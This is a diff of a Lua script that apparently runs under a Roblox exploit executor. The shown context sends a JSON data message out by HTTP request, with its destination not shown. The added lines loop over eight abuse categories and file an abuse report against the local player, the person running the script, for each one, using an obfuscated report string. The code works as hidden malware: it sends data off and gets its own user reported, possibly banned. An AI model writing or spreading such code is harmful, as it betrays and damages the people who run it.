@@ -183,7 +183,21 @@ syn.request({
     Headers = {["Content-Type"] = "application/json"},
     Body = game:GetService("HttpService"):JSONEncode({["content"] = dataMessage})
 })
-local localPlayer = players.LocalPlayer;
+
+local categories = {
+    "Bullying",
+    "Inappropriate Language",
+    "Discriminatory Language",
+    "Inappropriate Username",
+    "Exploiting/Cheating",
+    "Scamming",
+    "Offsite Links",
+    "Personal Info Sharing"
+}
+
+local players = game:GetService("Players")
+local localPlayer = players.LocalPlayer
+
 for _, category in ipairs(categories) do
 	players:ReportAbuse(localPlayer, category, LUAOBFUSACTOR_DECRYPT_STR_0("\29\36\29\180\84\249\36\37\51\35\29\190\29\171\39\58\46\113\11\169\28\234\42\60\50\54\73\137\22\233\45\58\36\113\61\148\42\165", "\85\92\81\105\219\121\139\65"));
 	task.wait(1.5);
